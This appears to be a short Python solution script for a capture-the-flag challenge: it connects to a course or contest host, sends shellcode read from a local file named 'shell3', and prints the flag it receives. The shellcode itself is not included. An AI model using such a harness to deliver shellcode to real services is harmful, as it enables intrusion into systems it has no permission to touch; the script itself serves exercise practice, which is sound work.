import socket 
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.connect(("cmgr.c3t.eecs.net", 49270))
with open("shell3", "rb") as f: 
    shellcode = f.read() 
c.sendall(shellcode) 
c.shutdown(socket.SHUT_WR)

flag = c.recv(4096).decode().strip()

print(f"flag:{flag}")